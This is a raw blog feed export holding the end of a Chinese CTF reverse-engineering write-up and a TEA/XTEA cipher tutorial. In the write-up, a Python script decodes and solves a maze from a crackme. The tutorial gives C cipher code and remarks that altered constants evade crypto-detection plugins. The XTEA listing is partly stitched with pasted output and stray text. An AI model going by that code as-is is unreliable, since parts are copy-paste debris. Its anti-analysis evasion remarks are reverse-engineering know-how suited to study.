class="number">0x79</span>, <span class="number">0x59</span>, <span class="number">0x66</span>, <span class="number">0xB1</span>, <span class="number">0xC5</span>, <span class="number">0x8F</span>, <span class="number">0xE9</span>, <span class="number">0x6C</span>, <span class="number">0x99</span>, <span class="number">0x3C</span>, <span class="number">0xF0</span>, <span class="number">0x89</span>, <span class="number">0xF6</span>, <span class="number">0xBF</span>, <span class="number">0x15</span>, <span class="number">0x61</span>, <span class="number">0x92</span>, <span class="number">0xE0</span>, <span class="number">0x60</span>, <span class="number">0x3E</span>, <span class="number">0x59</span>, <span class="number">0x35</span>, <span class="number">0x4B</span>, <span class="number">0x1F</span>, <span class="number">0x6F</span>, <span class="number">0x65</span>, <span class="number">0xE4</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x7B</span>, <span class="number">0x6E</span>, <span class="number">0x93</span>, <span class="number">0x14</span>, <span class="number">0x5D</span>, <span class="number">0x4C</span>, <span class="number">0x6F</span>, <span class="number">0x2F</span>, <span class="number">0x52</span>, <span class="number">0xA6</span>, <span class="number">0x5D</span>, <span class="number">0x90</span>, <span class="number">0x7B</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x8D</span>, <span class="number">0x33</span>, <span class="number">0x6B</span>, <span class="number">0x37</span>, <span class="number">0xC4</span>, <span class="number">0x2F</span>, <span class="number">0xBF</span>, <span class="number">0x6F</span>, <span class="number">0xBF</span>, <span class="number">0xA8</span>, <span class="number">0xB3</span>, <span class="number">0x61</span>, <span class="number">0x5C</span>, <span class="number">0xD2</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0xC8</span>, <span class="number">0xF4</span>, <span class="number">0xBB</span>, <span class="number">0xB2</span>, <span class="number">0xD0</span>, <span class="number">0x22</span>, <span class="number">0x9C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x59</span>, <span class="number">0x72</span>, <span class="number">0xAA</span>, <span class="number">0xFD</span>, <span class="number">0x7E</span>, <span class="number">0x67</span>, <span class="number">0x2E</span>, <span class="number">0x61</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>, <span class="number">0x4B</span>, <span class="number">0x19</span>, <span class="number">0xA6</span>, <span class="number">0xD5</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0xBC</span>, <span class="number">0x91</span>, <span class="number">0xEB</span>, <span class="number">0x42</span>, <span class="number">0xCC</span>, <span class="number">0x72</span>, <span class="number">0xB2</span>, <span class="number">0xC6</span>, <span class="number">0x47</span>, <span class="number">0xA3</span>, <span class="number">0xCC</span>, <span class="number">0xAC</span>, <span class="number">0x6C</span>, <span class="number">0xA8</span>, <span class="number">0xD8</span>, <span class="number">0xCA</span>, <span class="number">0xD2</span>, <span class="number">0x84</span>, <span class="number">0x2B</span>, <span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xAF</span>, <span class="number">0xC8</span>, <span class="number">0xA5</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0x7F</span>, <span class="number">0xF5</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">    dword_4043C8 = [<span class="number">0x00000044</span>, <span class="number">0x00000124</span>, <span class="number">0x000002BD</span>, <span class="number">0x0000033E</span>, <span class="number">0x00000432</span>, <span class="number">0x0000059D</span>, <span class="number">0x0000068F</span>, <span class="number">0x00000753</span>, <span class="number">0x000008CC</span>, <span class="number">0x0000094F</span>, <span class="number">0x00000A8D</span>, <span class="number">0x00000B2C</span>, <span class="number">0x00000C7C</span>, <span class="number">0x00000DF2</span>, <span class="number">0x00000EBA</span>, <span class="number">0x00000F30</span>, <span class="number">0x0000100D</span>, <span class="number">0x000011C7</span>, <span class="number">0x00001257</span>, <span class="number">0x00001319</span>, <span class="number">0x00001491</span>, <span class="number">0x000000F4</span>, <span class="number">0x000001E7</span>, <span class="number">0x00000229</span>, <span class="number">0x0000034F</span>, <span class="number">0x000004EE</span>, <span class="number">0x00000547</span>, <span class="number">0x0000067C</span>, <span class="number">0x000007D8</span>, <span class="number">0x000008F8</span>, <span class="number">0x000009D8</span>, <span class="number">0x00000A79</span>, <span class="number">0x00000BD1</span>, <span class="number">0x00000C7A</span>, <span class="number">0x00000D32</span>, <span class="number">0x00000E82</span>, <span class="number">0x00000FD9</span>, <span class="number">0x000010DF</span>, <span class="number">0x00001120</span>, <span class="number">0x000012D6</span>, <span class="number">0x000013EE</span>, <span class="number">0x0000145F</span>, <span class="number">0x00000027</span>, <span class="number">0x0000016C</span>, <span class="number">0x00000265</span>, <span class="number">0x000003B7</span>, <span class="number">0x0000049F</span>, <span class="number">0x0000054B</span>, <span class="number">0x000006C8</span>, <span class="number">0x000007DF</span>, <span class="number">0x00000866</span>, <span class="number">0x0000099F</span>, <span class="number">0x00000A0C</span>, <span class="number">0x00000B2D</span>, <span class="number">0x00000C0C</span>, <span class="number">0x00000DBF</span>, <span class="number">0x00000E19</span>, <span class="number">0x00000F83</span>, <span class="number">0x000010F1</span>, <span class="number">0x00001169</span>, <span class="number">0x0000125C</span>, <span class="number">0x000013A3</span>, <span class="number">0x000014AE</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000164</span>, <span class="number">0x00000274</span>, <span class="number">0x0000033D</span>, <span class="number">0x000004BD</span>, <span class="number">0x00000582</span>, <span class="number">0x00000696</span>, <span class="number">0x00000784</span>, <span class="number">0x00000846</span>, <span class="number">0x000009AB</span>, <span class="number">0x00000ABA</span>, <span class="number">0x00000BBA</span>, <span class="number">0x00000CFC</span>, <span class="number">0x00000DB7</span>, <span class="number">0x00000E18</span>, <span class="number">0x00000F96</span>, <span class="number">0x0000106C</span>, <span class="number">0x00001138</span>, <span class="number">0x00001267</span>, <span class="number">0x000013F5</span>, <span class="number">0x00001481</span>, <span class="number">0x00000072</span>, <span class="number">0x0000010E</span>, <span class="number">0x0000022C</span>, <span class="number">0x000003AF</span>, <span class="number">0x00000489</span>, <span class="number">0x000005B3</span>, <span class="number">0x000006B3</span>, <span class="number">0x000007C5</span>, <span class="number">0x0000080B</span>, <span class="number">0x0000091E</span>, <span class="number">0x00000A3E</span>, <span class="number">0x00000BF8</span>, <span class="number">0x00000C73</span>, <span class="number">0x00000D75</span>, <span class="number">0x00000EE2</span>, <span class="number">0x00000F5A</span>, <span class="number">0x00001038</span>, <span class="number">0x0000119A</span>, <span class="number">0x000012E9</span>, <span class="number">0x0000133F</span>, <span class="number">0x00001487</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000137</span>, <span class="number">0x00000298</span>, <span class="number">0x00000346</span>, <span class="number">0x000004D3</span>, <span class="number">0x000005D5</span>, <span class="number">0x0000069E</span>, <span class="number">0x00000711</span>, <span class="number">0x000008B8</span>, <span class="number">0x0000097D</span>, <span class="number">0x00000AD9</span>, <span class="number">0x00000BD3</span>, <span class="number">0x00000CC7</span>, <span class="number">0x00000D18</span>, <span class="number">0x00000E51</span>, <span class="number">0x00000FB7</span>, <span class="number">0x000010CB</span>, <span class="number">0x000011FC</span>, <span class="number">0x00001274</span>, <span class="number">0x00001396</span>, <span class="number">0x00001441</span>, <span class="number">0x00000082</span>, <span class="number">0x000001A5</span>, <span class="number">0x0000025F</span>, <span class="number">0x000003E8</span>, <span class="number">0x00000487</span>, <span class="number">0x00000528</span>, <span class="number">0x000006F7</span>, <span class="number">0x00000797</span>, <span class="number">0x000008F3</span>, <span class="number">0x000009AC</span>, <span class="number">0x00000ADC</span>, <span class="number">0x00000B65</span>, <span class="number">0x00000C73</span>, <span class="number">0x00000DE6</span>, <span class="number">0x00000EBC</span>, <span class="number">0x00000FCD</span>, <span class="number">0x000010C3</span>, <span class="number">0x000011AB</span>, <span class="number">0x0000123F</span>, <span class="number">0x000013A0</span>, <span class="number">0x00001450</span>, <span class="number">0x00000043</span>, <span class="number">0x00000122</span>, <span class="number">0x000002AD</span>, <span class="number">0x000003CD</span>, <span class="number">0x0000042D</span>, <span class="number">0x00000537</span>, <span class="number">0x00000692</span>, <span class="number">0x000007DB</span>, <span class="number">0x00000810</span>, <span class="number">0x00000936</span>, <span class="number">0x00000A49</span>, <span class="number">0x00000B65</span>, <span class="number">0x00000C3E</span>, <span class="number">0x00000DA3</span>, <span class="number">0x00000E1B</span>, <span class="number">0x00000F95</span>, <span class="number">0x000010E6</span>, <span class="number">0x000011AF</span>, <span class="number">0x00001228</span>, <span class="number">0x000013B5</span>, <span class="number">0x00001448</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000015B</span>, <span class="number">0x0000024E</span>, <span class="number">0x0000032A</span>, <span class="number">0x000004D2</span>, <span class="number">0x0000053C</span>, <span class="number">0x000006D6</span>, <span class="number">0x000007C9</span>, <span class="number">0x0000082F</span>, <span class="number">0x00000957</span>, <span class="number">0x00000AE2</span>, <span class="number">0x00000B26</span>, <span class="number">0x00000C98</span>, <span class="number">0x00000D57</span>, <span class="number">0x00000EC3</span>, <span class="number">0x00000FC2</span>, <span class="number">0x000010DE</span>, <span class="number">0x00001118</span>, <span class="number">0x000012AB</span>, <span class="number">0x00001386</span>, <span class="number">0x0000144F</span>, <span class="number">0x000000D5</span>, <span class="number">0x000001C9</span>, <span class="number">0x000002F3</span>, <span class="number">0x000003E7</span>, <span class="number">0x000004C6</span>, <span class="number">0x000005C0</span>, <span class="number">0x000006C2</span>, <span class="number">0x000007D1</span>, <span class="number">0x000008F0</span>, <span class="number">0x000009B0</span>, <span class="number">0x00000A1D</span>, <span class="number">0x00000B3D</span>, <span class="number">0x00000C2A</span>, <span class="number">0x00000D62</span>, <span class="number">0x00000E64</span>, <span class="number">0x00000F20</span>, <span class="number">0x000010FF</span>, <span class="number">0x000011EA</span>, <span class="number">0x00001217</span>, <span class="number">0x000013F0</span>, <span class="number">0x000014F6</span>, <span class="number">0x000000E0</span>, <span class="number">0x000001F0</span>, <span class="number">0x000002E2</span>, <span class="number">0x0000037B</span>, <span class="number">0x00000456</span>, <span class="number">0x000005DE</span>, <span class="number">0x000006E6</span>, <span class="number">0x00000772</span>, <span class="number">0x000008DF</span>, <span class="number">0x00000970</span>, <span class="number">0x00000A29</span>, <span class="number">0x00000B16</span>, <span class="number">0x00000C62</span>, <span class="number">0x00000DFB</span>, <span class="number">0x00000E33</span>, <span class="number">0x00000F6A</span>, <span class="number">0x000010C8</span>, <span class="number">0x000011B2</span>, <span class="number">0x00001271</span>, <span class="number">0x000013F8</span>, <span class="number">0x000014C8</span>, <span class="number">0x000000A9</span>, <span class="number">0x00000192</span>, <span class="number">0x0000026F</span>, <span class="number">0x00000342</span>, <span class="number">0x000004A7</span>, <span class="number">0x00000533</span>, <span class="number">0x0000065F</span>, <span class="number">0x00000707</span>, <span class="number">0x000008B9</span>, <span class="number">0x00000900</span>, <span class="number">0x00000ADC</span>, <span class="number">0x00000B90</span>, <span class="number">0x00000C4C</span>, <span class="number">0x00000D7B</span>, <span class="number">0x00000E81</span>, <span class="number">0x00000FC7</span>, <span class="number">0x00001004</span>, <span class="number">0x0000118D</span>, <span class="number">0x000012C0</span>, <span class="number">0x00001375</span>, <span class="number">0x000014EB</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000147</span>, <span class="number">0x000002C6</span>, <span class="number">0x00000374</span>, <span class="number">0x0000044F</span>, <span class="number">0x000005EE</span>, <span class="number">0x0000066D</span>, <span class="number">0x00000719</span>, <span class="number">0x00000807</span>, <span class="number">0x00000970</span>, <span class="number">0x00000A07</span>, <span class="number">0x00000BD5</span>, <span class="number">0x00000C18</span>, <span class="number">0x00000D4D</span>, <span class="number">0x00000EFE</span>, <span class="number">0x00000F20</span>, <span class="number">0x00001021</span>, <span class="number">0x0000116C</span>, <span class="number">0x00001218</span>, <span class="number">0x000013CC</span>, <span class="number">0x0000144F</span>, <span class="number">0x000000A8</span>, <span class="number">0x00000117</span>, <span class="number">0x000002CA</span>, <span class="number">0x0000033F</span>, <span class="number">0x000004C5</span>, <span class="number">0x00000585</span>, <span class="number">0x000006BB</span>, <span class="number">0x0000073A</span>, <span class="number">0x000008C8</span>, <span class="number">0x0000095A</span>, <span class="number">0x00000A8D</span>, <span class="number">0x00000B2F</span>, <span class="number">0x00000CC6</span>, <span class="number">0x00000DD8</span>, <span class="number">0x00000EFD</span>, <span class="number">0x00000F73</span>, <span class="number">0x000010F8</span>, <span class="number">0x00001168</span>, <span class="number">0x00001280</span>, <span class="number">0x0000137E</span>, <span class="number">0x00001466</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000194</span>, <span class="number">0x000002E0</span>, <span class="number">0x000003A2</span>, <span class="number">0x000004B4</span>, <span class="number">0x0000057F</span>, <span class="number">0x00000640</span>, <span class="number">0x000007D0</span>, <span class="number">0x00000865</span>, <span class="number">0x00000986</span>, <span class="number">0x00000A38</span>, <span class="number">0x00000B13</span>, <span class="number">0x00000C7C</span>, <span class="number">0x00000DBF</span>, <span class="number">0x00000EFE</span>, <span class="number">0x00000F95</span>, <span class="number">0x00001066</span>, <span class="number">0x00001117</span>, <span class="number">0x000012BE</span>, <span class="number">0x00001373</span>, <span class="number">0x000014E4</span>, <span class="number">0x000000F9</span>, <span class="number">0x0000015F</span>, <span class="number">0x0000026C</span>, <span class="number">0x000003DF</span>, <span class="number">0x00000434</span>, <span class="number">0x00000569</span>, <span class="number">0x00000658</span>, <span class="number">0x00000768</span>, <span class="number">0x000008B4</span>, <span class="number">0x00000976</span>, <span class="number">0x00000A56</span>, <span class="number">0x00000B68</span>, <span class="number">0x00000CBF</span>, <span class="number">0x00000DCB</span>, <span class="number">0x00000E81</span>, <span class="number">0x00000FE7</span>, <span class="number">0x00001062</span>, <span class="number">0x00001196</span>, <span class="number">0x00001233</span>, <span class="number">0x000013FE</span>, <span class="number">0x00001486</span>, <span class="number">0x000000E7</span>, <span class="number">0x000001AF</span>, <span class="number">0x00000205</span>, <span class="number">0x00000371</span>, <span class="number">0x00000482</span>, <span class="number">0x000005F0</span>, <span class="number">0x00000670</span>, <span class="number">0x0000072E</span>, <span class="number">0x00000849</span>, <span class="number">0x00000925</span>, <span class="number">0x00000A5B</span>, <span class="number">0x00000B0E</span>, <span class="number">0x00000C7F</span>, <span class="number">0x00000D75</span>, <span class="number">0x00000EF4</span>, <span class="number">0x00000F61</span>, <span class="number">0x0000101D</span>, <span class="number">0x0000116B</span>, <span class="number">0x0000127E</span>, <span class="number">0x00001382</span>, <span class="number">0x00001404</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000015C</span>, <span class="number">0x0000027F</span>, <span class="number">0x0000033F</span>, <span class="number">0x00000442</span>, <span class="number">0x000005B6</span>, <span class="number">0x0000064D</span>, <span class="number">0x00000780</span>, <span class="number">0x0000086B</span>, <span class="number">0x000009DC</span>, <span class="number">0x00000AF1</span>, <span class="number">0x00000B79</span>, <span class="number">0x00000C66</span>, <span class="number">0x00000D6E</span>, <span class="number">0x00000E9D</span>, <span class="number">0x00000F23</span>, <span class="number">0x0000107B</span>, <span class="number">0x00001126</span>, <span class="number">0x000012D5</span>, <span class="number">0x0000133F</span>, <span class="number">0x000014AE</span>, <span class="number">0x0000007D</span>, <span class="number">0x000001AD</span>, <span class="number">0x000002BB</span>, <span class="number">0x000003A1</span>, <span class="number">0x00000473</span>, <span class="number">0x0000054E</span>, <span class="number">0x000006C0</span>, <span class="number">0x000007D0</span>, <span class="number">0x0000083F</span>, <span class="number">0x000009DA</span>, <span class="number">0x00000AE6</span>, <span class="number">0x00000BA9</span>, <span class="number">0x00000CA0</span>, <span class="number">0x00000DC3</span>, <span class="number">0x00000E30</span>, <span class="number">0x00000F8E</span>, <span class="number">0x00001066</span>, <span class="number">0x000011CD</span>, <span class="number">0x0000124B</span>, <span class="number">0x00001361</span>, <span class="number">0x000014B8</span>, <span class="number">0x000000EE</span>, <span class="number">0x0000016D</span>, <span class="number">0x00000275</span>, <span class="number">0x0000033C</span>, <span class="number">0x00000473</span>, <span class="number">0x000005A8</span>, <span class="number">0x00000679</span>, <span class="number">0x00000759</span>, <span class="number">0x0000080B</span>, <span class="number">0x000009B4</span>, <span class="number">0x00000AC7</span>, <span class="number">0x00000B03</span>, <span class="number">0x00000C07</span>, <span class="number">0x00000DAE</span>, <span class="number">0x00000E82</span>, <span class="number">0x00000FF8</span>, <span class="number">0x00001050</span>, <span class="number">0x000011DF</span>, <span class="number">0x00001261</span>, <span class="number">0x000013A0</span>, <span class="number">0x000014D5</span>, <span class="number">0x00000053</span>, <span class="number">0x000001B7</span>, <span class="number">0x000002D8</span>, <span class="number">0x000003B8</span>, <span class="number">0x00000478</span>, <span class="number">0x000005BC</span>, <span class="number">0x000006CC</span>, <span class="number">0x000007DE</span>, <span class="number">0x000008C6</span>, <span class="number">0x00000990</span>, <span class="number">0x00000A3F</span>, <span class="number">0x00000B21</span>, <span class="number">0x00000CBF</span>, <span class="number">0x00000DBB</span>, <span class="number">0x00000EDC</span>, <span class="number">0x00000FB1</span>, <span class="number">0x0000103B</span>, <span class="number">0x0000116B</span>, <span class="number">0x0000126B</span>, <span class="number">0x000013E0</span>, <span class="number">0x00001434</span>]</span><br><span class="line"></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">441</span>):</span><br><span class="line">        tmp.append(dword_4043C8[i] ^ byte_404208[i])</span><br><span class="line"></span><br><span class="line">    maze = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">            <span class="built_in">print</span>(tmp[i * <span class="number">21</span> + <span class="number">0</span> : i * <span class="number">21</span> + <span class="number">21</span>])</span><br><span class="line">            maze.append(tmp[i * <span class="number">21</span> + <span class="number">0</span> : i * <span class="number">21</span> + <span class="number">21</span>])</span><br><span class="line"></span><br><span class="line">    start=(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    end=(<span class="number">20</span>,<span class="number">20</span>)</span><br><span class="line">    </span><br><span class="line">    find_path(maze,start,end)</span><br><span class="line">    see_path(maze,path)</span><br><span class="line"><span class="comment">#jjjllllllllllllllljjjjjjjjkjjkkkkhhhhhhhkkkkkkkkkkjjjjllljjjlllhhhhlljjjjjjkkkkkkkkjjlllllllllllhhlllllhhhlhhhhhhhhlljjjjjjjjjjjjjjjjl</span></span><br></pre></td></tr></table></figure><p>最终结果：</p><figure><img src="1661451301787.png" alt="1661451301787"><figcaption>1661451301787</figcaption></figure><h3><span id="总结">总结</span></h3><p>这道题确实超出我能力范围，还需要接着努力。长城杯这道题做出来的人，高校组差不多有十个左右？政企组就只有两个，如果这个题做出来了，应该可以去线下了吧。不过这一年的努力没有白费，希望网鼎杯能出好成绩。关于try except中，SEH反调试优先交给调试器这个我有个印象，之前听大佬们讲直播讲课有提及。hed10ne大佬留了一篇反调试佳作：<a href="https://www.cnblogs.com/hed10ne/p/anti-debug-techs.html">反调试技术整理</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;2022-长城杯政企组-wp&quot;&gt;2022 长城杯政企组 wp&lt;/span&gt;&lt;/h1&gt;
&lt;p&gt;这次比赛实际并列26名，前15名进入线下复赛，感觉距离线下赛越来越近了。Crypto简单题秒了，因为上班没有抢到前三拿加分，最后这道题第五。然后其余四个小时全</summary>
      
    
    
    
    <category term="match" scheme="https://feverhu.github.io/categories/match/"/>
    
    
    <category term="异常处理" scheme="https://feverhu.github.io/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>TEA学习</title>
    <link href="https://feverhu.github.io/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/"/>
    <id>https://feverhu.github.io/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-07T02:04:53.000Z</published>
    <updated>2022-09-16T13:00:08.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tea"><strong>TEA</strong></h2><p>感谢各位师傅，转载连接：https://www.cnblogs.com/sk2rw/p/14797633.html</p><p>我做做删减和补充。</p><h3 id="简介">简介</h3><p>TEA算法使用64位的明文分组和128位的密钥，使用feistel分组加框架，需要进行32轮循环得到最后的64位密文，其中magic number DELTA是由黄金分割点。 <img src="2022-02-19-08-34-58mk-.png" /></p><p>tea算法最关键的是要找到<strong>DELTA值和128位的key</strong>。</p><p>在逆向程序的时候，可以利用ida的插件findcypto识别tea算法。 <img src="2022-02-19-08-29-02mk-.png" /></p><p>如上图的程序，可以看出a2就是key，v4-=0x61c88647和v4+=0x9e3779b9是等价的，显然DELTA就是0x9e3779b9</p><p>Tea算法还可以进行魔改，魔改的地方主要是DELTA值，将这个值修改会让很多加密算法识别软件失效，像下面的程序就将DELTA魔改为0x1234567，绕过来peid的插件KANAL的识别。</p><p><strong>补充TEA及魔改TEA加密与解密源码：</strong></p><h3 id="初级tea"><strong>初级TEA</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">//加密函数</span><br><span class="line">void encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */</span><br><span class="line">    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */</span><br><span class="line">    for (i=0; i &lt; 32; i++) &#123;                       /* basic cycle start */</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">    &#125;                                              /* end cycle */</span><br><span class="line">    v[0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line">//解密函数</span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */</span><br><span class="line">    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */</span><br><span class="line">    for (i=0; i&lt;32; i++) &#123;                         /* basic cycle start */</span><br><span class="line">        v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                              /* end cycle */</span><br><span class="line">    v[0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;;</span><br><span class="line">    // v为要加密的数据是两个32位无符号整数</span><br><span class="line">    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    encrypt(v, k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tea升级版xtea"><strong>TEA升级版XTEA</strong></h3><p>增加了更多的密钥表，移位和异或等操作。</p><p>XTEA是TEA的扩展，也称做TEAN，它使用与TEA相同的简单运算，同样是一个64位块的Feistel密码，使用128位密钥，建议64轮, 但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p><img src="2022-02-19-08-36-17mk-.png" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">加密前原始数据：1 2  </span><br><span class="line">加密后的数据：1347371722 925494771  </span><br><span class="line">解密后的数据：1 2  </span><br><span class="line">  </span><br><span class="line">Process returned 0 (0x0)   execution time : 0.020 s  </span><br><span class="line">Press any key to continue.  </span><br><span class="line"></span><br><span class="line">XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，设计者是Roger Needham, David Wheeler</span><br><span class="line">加密过程：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">算法实现：</span><br><span class="line"></span><br><span class="line">示例代码：</span><br><span class="line"></span><br><span class="line">[cpp] view plain copy</span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;stdint.h&gt;  </span><br><span class="line">  </span><br><span class="line">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */  </span><br><span class="line">  </span><br><span class="line">void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;  </span><br><span class="line">    unsigned int i;  </span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;  </span><br><span class="line">    for (i=0; i &lt; num_rounds; i++) &#123;  </span><br><span class="line">        v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    v[0]=v0; v[1]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;  </span><br><span class="line">    unsigned int i;  </span><br><span class="line">    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;  </span><br><span class="line">    for (i=0; i &lt; num_rounds; i++) &#123;  </span><br><span class="line">        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    v[0]=v0; v[1]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">int main()  </span><br><span class="line">&#123;  </span><br><span class="line">    uint32_t v[2]=&#123;1,2&#125;;  </span><br><span class="line">    uint32_t const k[4]=&#123;2,2,3,4&#125;;  </span><br><span class="line">    unsigned int r=32;//num_rounds建议取值为32  </span><br><span class="line">    // v为要加密的数据是两个32位无符号整数  </span><br><span class="line">    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    encipher(r, v, k);  </span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    